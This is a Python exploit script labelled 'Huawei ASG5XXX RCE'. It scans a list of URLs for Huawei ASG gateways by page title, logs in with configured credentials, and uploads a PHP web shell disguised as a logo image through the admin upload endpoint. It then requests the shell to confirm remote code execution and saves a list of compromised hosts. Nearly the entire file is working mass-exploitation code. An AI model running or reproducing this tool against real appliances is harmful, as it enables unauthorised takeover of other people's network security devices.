import argparse
import json
import logging
import re
import sys
import requests
import yaml
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from urllib3.exceptions import InsecureRequestWarning

# Setup logging configuration
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s', filename='app.log')

# Disable warnings for unverified HTTP requests
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def load_config(file_path):
    """加载配置文件"""
    with open(file_path, 'r') as file:
        return yaml.safe_load(file)

def check_title(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    title = soup.title.text if soup.title else ""
    return re.match(r'^huawei\s*asg.*$', title, re.IGNORECASE) is not None

def create_session(config, url):
    """创建会话对象"""
    session = requests.Session()
    session.verify = False
    config['headers'].update({'Referer': url})
    session.headers.update(config['headers'])
    session.proxies.update(config['proxies'])
    return session

def login_hw(session, url, config):
    """登录操作"""
    try:
        login_url = url + config['path']['login']
        response = session.post(login_url, data=config['login_data'], timeout=10)
        response.raise_for_status()
        response_json = json.loads(response.text.replace('while(1);', ''))
        return response_json.get('code') == '1'
    except requests.RequestException as e:
        logging.error(f"Login failed: {e}")
        return False

def file_upload(session, url, config):
    """文件上传操作"""
    try:
        upload_url = url + config['path']['upload']
        test_files = {'adv_logo_file': ('test.png', config['file_content'], 'image/png')}
        response = session.post(upload_url, files=test_files, data=config['rce_data'], params=config['rce_params'], timeout=10)
        response.raise_for_status()
        return 'success' in response.text and 'adv_logo' in response.text
    except requests.RequestException as e:
        logging.error(f"Upload failed: {e}")
        return False

def load_urls(args):
    """加载检查URL"""
    if args.url:
        urls = [args.url]
    elif args.file:
        try:
            with open(args.file, 'r') as file:
                urls = [line.strip() for line in file if line.strip()]
        except IOError as e:
            logging.error(f"Failed to read file {args.file}: {e}")
            return []
    else:
        return []
    return [url for url in urls if urlparse(url).scheme in ['http', 'https']]

def save_results(results, filename):
    """保存到文件"""
    try:
        with open(filename, 'w') as file:
            for result in results:
                file.write(result + '\n')
    except IOError as e:
        logging.error(f"Failed to write to file {filename}: {e}")

def main():
    print("""
                    __   .__    .___  .___      .__ 
      ____________ |  | _|__| __| _/__| _/____  |__|
     /  ___/\____ \|  |/ /  |/ __ |/ __ |\__  \ |  |
     \___ \ |  |_> >    <|  / /_/ / /_/ | / __ \|  |
    /____  >|   __/|__|_ \__\____ \____ |(____  /__|
         \/ |__|        \/       \/    \/     \/    
    """)
    print("""
    use: Huawei ASG5XXX RCE
    author: Spkiddai
    github: https://github.com/spkiddai
    """)
    parser = argparse.ArgumentParser(description="Command-line tool for web application testing.")
    url_group = parser.add_mutually_exclusive_group(required=True)
    url_group.add_argument('-u', '--url', type=str, help='Specify a single URL for testing')
    url_group.add_argument('-f', '--file', type=str, help='Specify a file containing URLs')
    mode_group = parser.add_mutually_exclusive_group(required=True)
    mode_group.add_argument('-l', '--login', action='store_true', help='Only perform login verification')
    mode_group.add_argument('-t', '--test', action='store_true', help='Upload a test PHP shell file')
    parser.add_argument('-s', '--save', type=str, help='Save the results to a file')
    args = parser.parse_args()
    run(args)


def run(args):
    urls = load_urls(args)
    if not urls:
        logging.error("No URLs provided.")
        sys.exit(1)
    config = load_config('config.yaml')
    results = []

    for url in urls:
        session = create_session(config, url)
        response = session.get(url)
        if not check_title(response):
            logging.error(f"Title check failed for {url}. Skipping.")
            continue

        if args.login:
            if login_hw(session, url, config):
                print(f"{url} Login Success.")
                results.append(url)

        elif args.test:
            if login_hw(session, url, config) and file_upload(session, url, config):
                exec_url = url + config['path']['exec']
                response = session.get(exec_url)
                if response.status_code == 200:
                    print(f"{exec_url} Upload Success.")
                    results.append(exec_url)
        else:
            logging.error(f"Failed to login or upload for {url}.")
        session.cookies.clear()

    if args.save:
        save_results(results, args.save)

if __name__ == "__main__":
    main()